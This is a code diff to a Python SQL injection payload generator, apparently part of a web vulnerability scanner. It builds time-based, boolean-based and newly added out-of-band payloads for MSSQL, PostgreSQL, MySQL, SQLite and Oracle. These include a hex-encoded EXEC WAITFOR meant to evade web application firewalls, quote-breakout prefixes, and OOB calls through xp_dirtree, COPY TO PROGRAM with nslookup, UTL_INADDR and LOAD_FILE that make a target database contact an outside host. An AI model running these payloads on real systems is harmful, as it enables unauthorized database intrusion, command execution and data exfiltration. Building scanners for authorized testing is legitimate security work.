@@ -26,21 +26,9 @@ class AstPayloadGenerator:
         # --- MSSQL Special Handling for WAITFOR (Stacked Query with Obfuscation) ---
         if self.dialect == "mssql":
             delay_str = f"0:0:{sleep_time}"
-            # Advanced WAF bypass using hex-encoded payload and EXEC.
-            # This avoids keywords like 'WAITFOR' and 'DELAY' in the main query.
-            # Hex for "WAITFOR DELAY '" is 0x57414954464F522044454C41592027
-            # Hex for "'" is 0x27
             hex_encoded_payload = "0x57414954464F522044454C41592027" + delay_str.encode().hex() + "27"
             payload_fragment = f";DECLARE @S VARCHAR(4000);SET @S=CAST({hex_encoded_payload} AS VARCHAR(4000));EXEC(@S);--"
-
-            # Use the context to add the correct quote/comment.
-            if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED"]:
-                sql = "'" + payload_fragment
-            elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
-                sql = '"' + payload_fragment
-            else: # HTML_TEXT or unknown - assuming quote is needed to break out
-                sql = "'" + payload_fragment
-
+            sql = self._contextualize_string_payload(payload_fragment, context)
             payloads.append((sql, "MSSQL_WAITFOR_OBFUSCATED"))
             return payloads
 
@@ -48,33 +36,25 @@ class AstPayloadGenerator:
         if self.dialect == "postgresql":
             sleep_func = exp.Anonymous(this="pg_sleep", params=[sleep_time])
         elif self.dialect == "sqlite":
-            # The COUNT(*) method was ineffective. A better method is to force a computationally
-            # expensive operation. We use a nested query with RANDOMBLOB to make it harder
-            # for a query planner to optimize away and more specific to SQLite's behavior.
-            # Blob size is proportional to sleep time. 500k bytes/sec.
             blob_size = max(500000, int(sleep_time * 500000))
-            # This nested subquery is less likely to be optimized out.
             heavy_query = f"(SELECT 1 WHERE LENGTH(HEX(RANDOMBLOB({blob_size}))) > 0)"
-            # Check if the subquery returns a result.
             sleep_func = sqlglot.parse_one(f"{heavy_query} IS NOT NULL")
         else: # Default to MySQL's SLEEP
-            sleep_func = exp.Sleep(this=exp.Literal.number(sleep_time))
+            sleep_func = exp.Anonymous(this="SLEEP", params=[exp.Literal.number(sleep_time)])
 
         # Variations
-        # 1. Simple AND/OR
         for logic_op in [exp.And, exp.Or]:
             condition = logic_op(left=exp.Boolean(this=True), right=sleep_func.copy())
             sql = self._build_sql(condition, context)
             payloads.append((sql, f"{self.dialect.upper()}_SLEEP"))
 
-        # 2. BENCHMARK for MySQL
         if self.dialect == "mysql":
             benchmark_expr = exp.Anonymous(
                 this="BENCHMARK",
                 params=[exp.Literal.number(sleep_time * 1000000), exp.Anonymous(this="MD5", params=[exp.Literal.string("1")])]
             )
             for logic_op in [exp.And, exp.Or]:
-                condition = logic_op(left=exp.TRUE(), right=benchmark_expr.copy())
+                condition = logic_op(left=exp.Boolean(this=True), right=benchmark_expr.copy())
                 sql = self._build_sql(condition, context)
                 payloads.append((sql, f"MYSQL_BENCHMARK"))
 
@@ -83,67 +63,73 @@ class AstPayloadGenerator:
     def _generate_boolean_based(self, context: str) -> list[tuple[str, str, str]]:
         """Generates boolean-based payloads (true/false pairs)."""
         pairs = []
-
         conditions = [
-            (exp.EQ(this="1", to="1"), exp.EQ(this="1", to="2")), # 1=1 vs 1=2
-            (exp.Like(this="'a'", to="'a'"), exp.Like(this="'a'", to="'b'")), # 'a' LIKE 'a' vs 'a' LIKE 'b'
+            (exp.EQ(this="1", to="1"), exp.EQ(this="1", to="2")),
+            (exp.Like(this="'a'", to="'a'"), exp.Like(this="'a'", to="'b'")),
         ]
-
         for true_cond, false_cond in conditions:
             for logic_op in [exp.And, exp.Or]:
                 true_expr = logic_op(left=exp.Boolean(this=True), right=true_cond.copy())
                 false_expr = logic_op(left=exp.Boolean(this=True), right=false_cond.copy())
-
                 true_sql = self._build_sql(true_expr, context)
                 false_sql = self._build_sql(false_expr, context)
-
                 pairs.append((true_sql, false_sql, f"LOGICAL_{logic_op.__name__.upper()}"))
-
         return pairs
+
+    def _generate_oob(self, collaborator_url: str, context: str) -> list[tuple[str, str]]:
+        """Generates out-of-band (OOB) payloads."""
+        payloads = []
+        if "://" in collaborator_url:
+            collaborator_url = collaborator_url.split("://")[1]
+
+        oob_payload_str, family = "", ""
+        if self.dialect == "mssql":
+            oob_payload_str = f";EXEC master..xp_dirtree '\\\\{collaborator_url}\\a'"
+            family = "MSSQL_XP_DIRTREE"
+        elif self.dialect == "postgresql":
+            oob_payload_str = f";COPY (SELECT '') TO PROGRAM 'nslookup {collaborator_url}'"
+            family = "POSTGRES_COPY_PROGRAM"
+        elif self.dialect == "oracle":
+            oob_payload_str = f" AND UTL_INADDR.GET_HOST_ADDRESS('{collaborator_url}') IS NOT NULL"
+            family = "ORACLE_UTL_INADDR"
+        elif self.dialect == "mysql":
+            oob_payload_str = f" AND LOAD_FILE('\\\\{collaborator_url}\\a')"
+            family = "MYSQL_LOAD_FILE"
+
+        if oob_payload_str:
+            sql = self._contextualize_string_payload(oob_payload_str, context)
+            payloads.append((sql, family))
+        return payloads
+
+    def _contextualize_string_payload(self, payload: str, context: str) -> str:
+        """Adds context-specific prefixes/suffixes to a raw string payload."""
+        if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED", "HTML_ATTRIBUTE"]:
+            sql = "'" + payload + "-- "
+        elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
+            sql = '"' + payload + "-- "
+        else:
+            if payload.strip().startswith(';'):
+                sql = "'" + payload + "-- "
+            else:
+                sql = payload + "-- "
+        return sql
 
     def _build_sql(self, expression: exp.Expression, context: str) -> str:
         """Serializes the expression to SQL and adds context prefixes/suffixes."""
-        # TODO: The 'context' part needs to be more robust. For now, we just handle simple cases.
-
-        # Base serialization
-        # We add a space to ensure separation from a potential preceding value.
-        sql = " " + expression.sql(dialect=self.dialect)
-
-        if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED"]:
-            # e.g., ' AND 1=1--
-            sql = "'" + sql + "-- "
-        elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
-            # e.g., " AND 1=1--
-            sql = '"' + sql + "-- "
-        else: # HTML_TEXT or unknown
-            # e.g., AND 1=1--
-            sql = sql + "-- "
-
-        return sql
+        sql_str = " " + expression.sql(dialect=self.dialect)
+        return self._contextualize_string_payload(sql_str, context)
 
     def generate(self, payload_type: str, context: str, options: dict = None) -> list:
-        """
-        Generates a list of SQLi payloads.
-
-        Args:
-            payload_type: The type of payload to generate (e.g., "TIME_BASED").
-            context: The injection context (e.g., "HTML_ATTRIBUTE_SINGLE_QUOTED").
-            options: A dictionary of options, e.g., {"sleep_time": 5}.
-
-        Returns:
-            A list of payloads. For boolean-based, it's [(true, false, family), ...].
-            For time-based, it's [(payload, family), ...].
-        """
+        """Generates a list of SQLi payloads."""
         options = options or {}
-
         if payload_type == "TIME_BASED":
-            sleep_time = options.get("sleep_time", 5)
-            return self._generate_time_based(sleep_time, context)
+            return self._generate_time_based(options.get("sleep_time", 5), context)
         elif payload_type == "BOOLEAN_BASED":
             return self._generate_boolean_based(context)
-        else:
-            # TODO: Add support for other payload types like ERROR_BASED, OOB_PAYLOADS
-            return []
+        elif payload_type == "OOB":
+            collaborator_url = options.get("collaborator_url")
+            return self._generate_oob(collaborator_url, context) if collaborator_url else []
+        return []
 
 if __name__ == '__main__':
     # Example usage for testing
